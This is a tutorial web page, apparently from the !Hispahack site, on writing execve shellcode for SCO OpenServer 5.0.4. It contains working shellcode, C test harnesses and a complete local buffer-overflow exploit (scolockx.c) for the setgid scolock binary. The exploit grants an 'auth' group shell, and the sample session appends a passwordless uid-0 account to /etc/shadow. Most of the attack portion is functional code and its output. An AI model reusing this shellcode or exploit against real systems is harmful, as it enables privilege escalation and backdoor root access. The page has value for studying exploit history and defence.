@@ -1,0 +1,877 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.5 [es] (Win95; I) [Netscape]">
+   <title>Programming a shellcode in SCO</title>
+</head>
+<body text="#33CCFF" bgcolor="#000000" link="#66FFFF" vlink="#66FFFF" alink="#FFFFFF">
+
+<blockquote>
+<blockquote>
+<center><pre><b><u><font size=+2>Programming a shellcode in SCO</font></u></b></pre></center>
+</blockquote>
+</blockquote>
+
+<blockquote>
+<blockquote>
+<div ALIGN=right><pre>By <i>Renegade Master</i></pre></div>
+</blockquote>
+</blockquote>
+
+<blockquote>
+<blockquote>
+<pre><b><u><font size=+1>Introduction</font></u></b></pre>
+
+<pre>The first time I faced programming an exploit based upon a buffer overflow,
+it was under Linux and I simply selected a shellcode which was previously
+coded by someone else from the tons available and pasted it into my code.</pre>
+
+<pre>Nonetheless when I tried to do the same in SCO i realized that there weren't
+practically any shellcodes for SCO, I could only find 2 acceptable
+shellcodes (although they lacked debugging) which were the ones the rest
+were based upon.</pre>
+
+<pre>Thus I decided to start programming my own shellcode from scratch, trying to
+make it more efficient and compact than the other ones. This is the
+result...</pre>
+
+<pre><b><u><font size=+1>Gdb</font></u></b></pre>
+
+<pre>Firstly let's take a look at how a SCO machine works when it executes a
+command (/bin/sh in this case).</pre>
+
+<pre><i>**NOTE**</i> All examples are taken from a SCO OpenServer 5.0.4 machine so some
+of them may not work under another SCO type of Unix (like unixware) although
+I have tried to make it as portable as possible.</pre>
+
+<pre>We create a little program in C that simply executes '/bin/sh'.</pre>
+
+<pre>-execve.c-----------------------------------------------------------------
+
+main() {</pre>
+
+<pre>execve("/bin/sh",0,0);</pre>
+
+<pre>}
+
+--------------------------------------------------------------------------</pre>
+
+<pre>scosysv:~$ ./execve
+
+$</pre>
+
+<pre>It works.</pre>
+
+<pre>We compile it and trace it through the debugger (gdb in this case) to see
+its assembler output.</pre>
+
+<pre><i>scosysv:~# gdb
+
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+
+GDB 4.15.1 (i486-sco3.2v5.0), Copyright 1995 Free Software Foundation, Inc.
+
+(gdb) file execve
+
+Reading symbols from execve...(no debugging symbols found)...done.
+
+(gdb) disassemble main
+
+Dump of assembler code for function main:
+
+0x15c &lt;main>:&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x171 &lt;main+21>
+
+0x15e &lt;main+2>: pushl&nbsp; $0x0
+
+0x160 &lt;main+4>: pushl&nbsp; $0x0
+
+0x162 &lt;main+6>: pushl&nbsp; $0x400878
+
+0x167 &lt;main+11>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x2fc &lt;_execve>
+
+0x16c &lt;main+16>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0xc,%esp
+
+0x16f &lt;main+19>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leave
+
+0x170 &lt;main+20>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret
+
+0x171 &lt;main+21>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp
+
+0x172 &lt;main+22>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp
+
+0x174 &lt;main+24>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x15e &lt;main+2>
+
+0x176 &lt;main+26>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop
+
+0x177 &lt;main+27>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop
+
+End of assembler dump.
+
+(gdb) disassemble execve
+
+Dump of assembler code for function _execve:
+
+0x2fc &lt;_execve>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x3b,%eax
+
+0x301 &lt;_execve+5>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lcall&nbsp; 0x7,0x0
+
+0x308 &lt;_execve+12>:&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x7f8 &lt;_cerror>
+
+0x30d &lt;_execve+17>:&nbsp;&nbsp;&nbsp;&nbsp; nop
+
+0x30e &lt;_execve+18>:&nbsp;&nbsp;&nbsp;&nbsp; nop
+
+0x30f &lt;_execve+19>:&nbsp;&nbsp;&nbsp;&nbsp; nop
+
+End of assembler dump.</i></pre>
+
+<pre>Once this has been seen we obtain a little assembler draft.</pre>
+
+<pre><i>main:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl 0x0
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl 0x0
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl address_of_/bin/sh
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call execve
+
+execve:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl $0x3b,%eax
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lcall 0x7,0x0</i></pre>
+
+<pre>As you can see it is simpler than in other systems like Linux, just 6 lines
+of assembly code.</pre>
+
+<pre>It still is a very rough draft and needs to be sharpened, but it will become
+the skeleton of our shellcode.</pre>
+
+<pre><b><u><font size=+1>Shellcode 1</font></u></b></pre>
+
+<pre>We've already a little assembly draft of what we should do, so we start with
+a very simple shellcode, without any kind of debugging, it will serve us as
+a foundation to develop more advanced ones.</pre>
+
+<pre>We start from the previous draft:</pre>
+
+<pre><i>main:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl 0x0
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl 0x0
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl address_of_/bin/sh
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call execve
+
+execve:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl $0x3b,%eax
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lcall 0x7,0x0</i></pre>
+
+<pre><i>We have to add to it some more code:</i></pre>
+
+<pre><i>(1) We need to put the string /bin/sh in memory
+(2) We need a routine to know where that string is located.</i></pre>
+
+<pre><i>The code we obtain is:</i></pre>
+
+<pre><i>"\xeb\x12" // start: jmp uno (2)
+
+"\x5e" // dos: popl %esi
+
+"\x31\xdb" // xorl %ebx,%ebx
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xb0\x3b" // movb $0x3b,%al
+
+"\x53" // pushl %ebx
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x56" // pushl %esi (3)
+
+"\x9a\x00\x00\x00\x00\x07\x00" // execve: lcall 0x7,0x0
+
+"\xe8\xe9\xff\xff\xff" // uno: call dos
+
+"/bin/sh\x00"; // (1)</i></pre>
+
+<pre>(1) We put the string /bin/sh at the end of the code.</pre>
+
+<pre>(2) We do a call before the string /bin/sh [call dos], thus the address of
+the string is stored on the stack (when we do a call the %eip register is
+pushed on the stack) then we retrieve it and store it in %esi [popl %esi]</pre>
+
+<pre>The %eip register is the instruction pointer and the value it takes when we
+do the call is the address of the string /bin/sh.</pre>
+
+<pre>(3) The first three pushl correspond to the execve call. We push a fourth
+value onto the stack [pushl %esi] to make the thing work.</pre>
+
+<pre>We then create a little C simulator to check the code works properly.</pre>
+
+<pre><i>-shell30.c----------------------------------------------------------------
+
+char hell[]=
+
+"\xeb\x12" // start: jmp uno
+
+"\x5e" // dos: popl %esi
+
+"\x31\xdb" // xorl %ebx,%ebx
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xb0\x3b" // movb $0x3b,%al
+
+"\x53" // pushl %ebx
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x56" // pushl %esi
+
+"\x9a\x00\x00\x00\x00\x07\x00" // execve: lcall 0x7,0x0
+
+"\xe8\xe9\xff\xff\xff" // uno: call dos
+
+"/bin/sh\x00";</i></pre>
+
+<pre><i>void main() {
+
+int *ret;</i></pre>
+
+<pre><i>printf("%i\n",strlen(hell));</i></pre>
+
+<pre><i>ret = (int *)&amp;ret + 2;
+
+(*ret) = (int)hell;
+
+}
+
+--------------------------------------------------------------------------</i></pre>
+
+<pre><i>scosysv~$ shell30
+
+14
+
+$</i></pre>
+
+<pre>It works.</pre>
+
+<pre><b><u><font size=+1>Shellcode 2</font></u></b></pre>
+
+<pre>The previous shellcode isn't very useful in practice as it contains null
+characters \x00 that will give us many troubles if we want to use them to
+exploit an overflow.</pre>
+
+<pre>The null character represents the end of a string, so usually if we try to
+use a shellcode with null characters in an exploit, it will be cut when it
+is handled by the target program.</pre>
+
+<pre>This second shellcode corrects this defect removing every null bytes with a
+little self modification routine.</pre>
+
+<pre><i>"\xeb\x16" // start: jmp uno
+
+"\x5e" // dos: popl %esi
+
+"\x31\xdb" // xorl %ebx,%ebx
+
+"\x89\x5e\x07" // movb %bl,0x7(%esi)&nbsp;&nbsp;&nbsp; -> This three lines will set to zero
+
+"\x89\x5e\x0c" // movl %ebx,0x0c(%esi)&nbsp;&nbsp;&nbsp;&nbsp; the bytes that were \x00 (and now
+
+"\x88\x5e\x11" // movb %bl,0x11(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \xaa)
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xb0\x3b" // movb $0x3b,%al
+
+"\x53" // pushl %ebx
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x56" // pushl %esi
+
+"\xeb\x10" // jmp execve
+
+"\xe8\xe5\xff\xff\xff" // uno: call dos
+
+"/bin/sh"
+
+"\xaa\xaa\xaa\xaa"
+
+"\x9a\xaa\xaa\xaa\xaa\x07\xaa"; // execve: lcall 0x7,0x0</i></pre>
+
+<pre>The code can be still improved, we could afford 3 or 4 bytes in its size but
+this improvement would be of little relevance.</pre>
+
+<pre>We change the call to execve [lcall 0x7,0x0] at the end of the code to make
+it easier to handle.</pre>
+
+<pre>We use again the simulator to check it is working:</pre>
+
+<pre><i>-shell15.c----------------------------------------------------------------
+
+char hell[]=
+
+"\xeb\x16" // start: jmp uno
+
+"\x5e" // dos: popl %esi
+
+"\x31\xdb" // xorl %ebx,%ebx
+
+"\x89\x5e\x07" // movb %bl,0x7(%esi)
+
+"\x89\x5e\x0c" // movl %ebx,0x0c(%esi)
+
+"\x88\x5e\x11" // movb %bl,0x11(%esi)
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xb0\x3b" // movb $0x3b,%al
+
+"\x53" // pushl %ebx
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x56" // pushl %esi
+
+"\xeb\x10" // jmp execve
+
+"\xe8\xe5\xff\xff\xff" // uno: call dos
+
+"/bin/sh"
+
+"\xaa\xaa\xaa\xaa"
+
+"\x9a\xaa\xaa\xaa\xaa\x07\xaa"; // execve: lcall 0x7,0x0</i></pre>
+
+<pre><i>void main() {
+
+int *ret;</i></pre>
+
+<pre><i>printf("%i\n",strlen(hell));</i></pre>
+
+<pre><i>ret = (int *)&amp;ret + 2;
+
+(*ret) = (int)hell;
+
+}
+
+--------------------------------------------------------------------------</i></pre>
+
+<pre><i>scosysv~$ shell15
+
+47
+
+$</i></pre>
+
+<pre>It works.</pre>
+
+<pre><b><u><font size=+1>Shellcode 3</font></u></b></pre>
+
+<pre>We will add one more layer of complexity, now we want the shellcode to
+execute not only a shell (/bin/sh) but also a complete command and we also
+want it to let us modify the command without the need to recompile the whole
+shellcode.</pre>
+
+<pre>This means it is more complex as we used a little trick to reduce the size
+of the first shellcode.</pre>
+
+<pre>The call to execve works in the following way:</pre>
+
+<pre>execve(address_of_the_command,array_of_parameters,array_of_environment_variables)
+
+
+In assembler it would be:</pre>
+
+<pre><i>push array_of_environment_variables
+
+push array_of_parameters
+
+push address_of_the_command
+
+call execve</i></pre>
+
+<pre>In the first shellcode we had simplified the two arrays setting in their
+place a null pointer:</pre>
+
+<pre><i>push 0
+
+push 0
+
+push address_of_the_string_/bin/sh
+
+call execve</i></pre>
+
+<pre>Now we cannot define a null pointer as an array of parameters and we have to
+create an array for them.</pre>
+
+<pre>The array has to contain the command name (argv[0]) and the rest of the
+arguments.</pre>
+
+<pre>To reduce the number of elements in the array we'll use the '-c' option of
+the shell.</pre>
+
+<pre>/bin/sh&nbsp;&nbsp;&nbsp; -c&nbsp;&nbsp;&nbsp; "command"
+
+argv[0]&nbsp; argv[1]&nbsp; argv[2]</pre>
+
+<pre>Thus the array appears like this:
+
+argv[0] -> address of the string /bin/sh
+
+argv[1] -> address of the string -c
+
+argv[2] -> address of the string which contains the command
+
+0 -> null pointer</pre>
+
+<pre>16 bytes total.</pre>
+
+<pre>And in assembler:</pre>
+
+<pre><i>push 0
+
+push address_of_array
+
+push argv[0] -> address of the string /bin/sh
+
+call execve</i></pre>
+
+<pre>Now let's see the resulting shellcode obtained after applying this changes to
+our shellcode.</pre>
+
+<pre><i>"\x31\xdb" // xorl %ebx,%ebx
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xeb\x30" // jmp uno
+
+"\x5e" // dos: popl %esi
+
+"\x8d\x7e\x10" // leal 16(%esi),%edi
+
+"\x89\xf9" // movl %edi,%ecx
+
+"\x89\x3e" // movl %edi,(%esi)
+
+"\x8d\x7e\x18" // leal 24(%esi),%edi -> Array creation routine
+
+"\x89\x7e\x04" // movl %edi,4(%esi)
+
+"\x8d\x7e\x1b" // leal 27(%esi),%edi
+
+"\x89\x7e\x08" // movl %edi,8(%esi)
+
+"\x89\x5e\x0c" // movl %ebx,12(%esi)
+
+"\x89\x5e\xf5" // movl %ebx,-11(%esi) -> \xaa correction routine
+
+"\x88\x5e\xfa" // movb %bl,-6(%esi)
+
+"\x88\x5e\x17" // movb %bl,23(%esi)
+
+"\x88\x5e\x1a" // movb %bl,26(%esi)
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x51" // pushl %ecx
+
+"\x51" // pushl %ecx
+
+"\xb0\x3b" // movb 0x3b, %al
+
+"\x9a\xaa\xaa\xaa\xaa\x07\xaa" // lcall 0x7,0x0
+
+"\xe8\xcb\xff\xff\xff" // uno: call dos
+
+"AAAA" // +0 -> This is the array
+
+"AAAA" // +4
+
+"AAAA" // +8
+
+"AAAA" // +12
+
+"/bin/shA" // (1) +16 0x10(%esi) -> first string
+
+"-cA" // (2) +24 0x18(%esi) -> second string
+
+""; // (3) +27 0x1b(%esi) -> We allocate this space to put here the string
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; of the command to execute.</i></pre>
+
+<pre>We add a routine which creates a 16 bytes array and stores the addresses of
+the 3 relevant strings in it, and a null pointer as fourth item of the array
+to define the end of the array.</pre>
+
+<pre>The number of lines of code to substitute the \xaa by \x00 characters is
+longer.</pre>
+
+<pre>Now the simulator is a bit more complex:</pre>
+
+<pre><i>-shell33.c-----------------------------------------------------------------
+
+char hell[]=
+
+"\x31\xdb" // xorl %ebx,%ebx
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xeb\x30" // jmp uno
+
+"\x5e" // dos: popl %esi
+
+"\x8d\x7e\x10" // leal 16(%esi),%edi
+
+"\x89\xf9" // movl %edi,%ecx
+
+"\x89\x3e" // movl %edi,(%esi)
+
+"\x8d\x7e\x18" // leal 24(%esi),%edi
+
+"\x89\x7e\x04" // movl %edi,4(%esi)
+
+"\x8d\x7e\x1b" // leal 27(%esi),%edi
+
+"\x89\x7e\x08" // movl %edi,8(%esi)
+
+"\x89\x5e\x0c" // movl %ebx,12(%esi)
+
+"\x89\x5e\xf5" // movl %ebx,-11(%esi)
+
+"\x88\x5e\xfa" // movb %bl,-6(%esi)
+
+"\x88\x5e\x17" // movb %bl,23(%esi)
+
+"\x88\x5e\x1a" // movb %bl,26(%esi)
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x51" // pushl %ecx
+
+"\x51" // pushl %ecx
+
+"\xb0\x3b" // movb 0x3b, %al
+
+"\x9a\xaa\xaa\xaa\xaa\x07\xaa" // lcall 0x7,0x0
+
+"\xe8\xcb\xff\xff\xff" // uno: call dos
+
+"AAAA" // +0
+
+"AAAA" // +4
+
+"AAAA" // +8
+
+"AAAA" // +12
+
+"/bin/shA" // (1) +16 0x10(%esi)
+
+"-cA" // (2) +24 0x18(%esi)
+
+""; // (3) +27 0x1b(%esi)</i></pre>
+
+<pre><i>char buf[300];</i></pre>
+
+<pre><i>void main(int argc, char **argv) {
+
+int *ret;
+
+char cmd[200];
+
+char test[]="/usr/bin/id";
+
+char end[]=";\x00";</i></pre>
+
+<pre><i>printf("%i\n",strlen(hell));</i></pre>
+
+<pre><i>if(argc &lt; 2) {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(cmd,test,strlen(test));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(buf,hell,strlen(hell));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(buf+strlen(hell),cmd,strlen(cmd));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(buf+strlen(hell)+strlen(cmd),end,strlen(end));
+
+} else {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(argc == 2) {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strncpy(cmd,argv[1],strlen(argv[1]));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(buf,hell,strlen(hell));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; emcpy(buf+strlen(hell),cmd,strlen(argv[1]));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(buf+strlen(hell)+strlen(argv[1]),end,strlen(end));
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Uso: shell33 \"comando\"\n");
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0); }
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</i></pre>
+
+<pre><i>ret = (int *)&amp;ret + 2;
+
+(*ret) = (int)buf;</i></pre>
+
+<pre><i>}
+
+--------------------------------------------------------------------------</i></pre>
+
+<pre>The new snippets add the string string holding the command to be executed at
+the end of the shellcode.</pre>
+
+<pre><i>scosysv~$ shell33 "/usr/bin/id"
+
+86
+
+uid=200(guest) gid=50(group) groups=50(group)</i></pre>
+
+<pre><i>scosysv~$ shell33 "echo hola"
+
+86
+
+hola</i></pre>
+
+<pre>It works.</pre>
+
+<pre><b><u><font size=+1>Exploit 1</font></u></b></pre>
+
+<pre>Once we have a theoretically working shellcode, we have to test whether it
+works or not in practice, inside of an exploit.</pre>
+
+<pre>The bug which we're going to exploit is an overflow in one of the scolock
+(/usr/bin/X11/scolock) program's arguments, a suid screen saver as group
+
+'auth'. -> sgid(auth)</pre>
+
+<pre>$ ls -al /opt/K/SCO/BaseX/5.1.2b/usr/bin/X11/scolock
+
+-rwxr-sr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 155956 May 25 22:50 scolock</pre>
+
+<pre>This group has read/write access to the /etc/shadow file thus obtaining root
+using this exploit is hardly a question of time.</pre>
+
+<pre>$ ls -al /etc/shadow
+
+-rw-rw----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 323 Jun 14 23:09 /etc/shadow</pre>
+
+<pre>This program has several exploitable overflows, but let's concentrate in the
+one that is produced with the '-bg' argument.</pre>
+
+<pre>The following exploit is an unpublished one, and there is no patch for the
+bug: (Oh my god! someone send this to bugtraq! ;)</pre>
+
+<pre><i>-scolockx.c---------------------------------------------------------------
+
+/*
+&nbsp;* &lt;scolockx.c> Local exploit - Gives you an auth group suid shell
+&nbsp;*
+&nbsp;* h0h0h0!! auth group has read/write access to /etc/shadow (w3 4r3 r00t!)
+&nbsp;*
+&nbsp;* $ ls -al /etc/shadow
+&nbsp;* -rw-rw----&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 323 Jun 14 23:09 /etc/shadow
+&nbsp;*
+&nbsp;* Offset: scolockx (SCO OpenServer 5.0.4)
+&nbsp;* 0 -> with -display parameter
+&nbsp;*
+&nbsp;* Usage:
+&nbsp;* $ cc scolockx.c -o scolockx
+&nbsp;* $ /usr/bin/X11/scolock -display 1.1.1.1:0 -bg `scolockx 0`
+&nbsp;*
+&nbsp;* Note: scolock need to be run from a valid x-display
+&nbsp;*
+&nbsp;* By: The Renegade Master
+&nbsp;*
+&nbsp;*/</i></pre>
+
+<pre><i>#include &lt;stdlib.h>
+#include &lt;stdio.h></i></pre>
+
+<pre><i>char hell[]=
+
+"\xeb\x16" // start: jmp uno
+
+"\x5e" // dos: popl %esi
+
+"\x31\xdb" // xorl %ebx,%ebx
+
+"\x89\x5e\x07" // movb %bl,0x7(%esi)
+
+"\x89\x5e\x0c" // movl %ebx,0x0c(%esi)
+
+"\x88\x5e\x11" // movb %bl,0x11(%esi)
+
+"\x31\xc0" // xorl %eax,%eax
+
+"\xb0\x3b" // movb $0x3b,%al
+
+"\x53" // pushl %ebx
+
+"\x53" // pushl %ebx
+
+"\x56" // pushl %esi
+
+"\x56" // pushl %esi
+
+"\xeb\x10" // jmp execve
+
+"\xe8\xe5\xff\xff\xff" // uno: call dos
+
+"/bin/sh"
+
+"\xaa\xaa\xaa\xaa"
+
+"\x9a\xaa\xaa\xaa\xaa\x07\xaa"; // execve: lcall 0x7,0x0</i></pre>
+
+<pre><i>#define OFF 0x8047a98&nbsp;&nbsp; // SCO OpenServer 5.0.4
+
+#define ALINEA 0
+
+#define LEN 2000</i></pre>
+
+<pre><i>int main(int argc, char *argv[]) {</i></pre>
+
+<pre><i>int offset=0;
+
+char buf[LEN];
+
+int i;</i></pre>
+
+<pre><i>if(argc &lt; 2) {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Usage: scolockx &lt;offset>\n");
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0); }
+
+else {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; offset=atoi(argv[1]); }</i></pre>
+
+<pre><i>memset(buf,0x90,LEN);
+
+memcpy(buf+1000,hell,strlen(hell));
+
+for(i=1100+ALINEA;i&lt;LEN-4;i+=4)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(int *)&amp;buf[i]=OFF+offset;</i></pre>
+
+<pre><i>for(i=0;i&lt;LEN;i++)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; putchar(buf[i]);</i></pre>
+
+<pre><i>exit(0);
+
+}
+
+--------------------------------------------------------------------------</i></pre>
+
+<pre><i>scosysv:~$ /usr/bin/X11/scolock -display 127.0.0.1:0.0 -bg `./scolockx 0`
+
+Warning: Color name "&euml;^1&Ucirc;^^^1&Agrave;&deg;;SSVV&euml;&egrave;&aring;&yuml;&yuml;&yuml;/bin/sh&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;zzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz^1&Ucirc;^^^1&Agrave;&deg;;SSVV&euml;&egrave;&aring;&yuml;&yuml;&yuml;/bin/sh&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;
+
+&ordf;&ordf;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz^1&Ucirc;^^^1&Agrave;&deg;;S
+
+SVV&euml;&egrave;&aring;&yuml;&yuml;&yuml;/bin/sh&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;&ordf;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+
+zzzzzzzzzzzz^1&Ucirc;^^^1&Agrave;&deg;;SSVV&euml;&egrave;&aring;&yuml;&yuml;
+
+Warning: some arguments in previous message were lost
+
+$ id
+
+uid=200(guest) gid=50(group) egid=21(auth) groups=50(group)
+
+$ echo "draver::0:0:r00t:/:/bin/sh" >> /etc/shadow
+
+
+
+</i>As you can see the exploit couldn't be simpler, the most important part is the
+shellcode, there is where the need to obtain a good shellcode comes, compact
+and reliable.
+
+
+
+Other important points to take into account are that the overflowed buffer
+is about 1800 characters in size, with a correct alignment and a return
+address which is approximately 0x8047a98. With this information and the
+shellcode coding the exploit was trivial indeed.
+
+
+
+
+
+<b><u><font size=+1>Conclusion
+
+
+</font></u></b>The first step we should make in every platform to code our own exploits is
+to obtain a good shellcode, using a previously coded, modifying it or
+creating our own.
+
+
+
+But we will achieve the most control over the exploit when the shellcode is
+self-made.
+
+
+
+Greetings
+
+
+
+&nbsp; Renegade Master</pre>
+
+<pre></pre>
+</blockquote>
+</blockquote>
+<font size=-1></font>
+<br><font size=-1></font>&nbsp;<font size=-1></font>
+<center>
+<p><font size=-1>(C) 1997-2001 by !Hispahack</font>
+<br><font size=-1>Para ver el web en las mejores condiciones, usa una resoluci&oacute;n
+de 800x600 y Netscape Navigator</font></center>
+
+</body>
+</html>
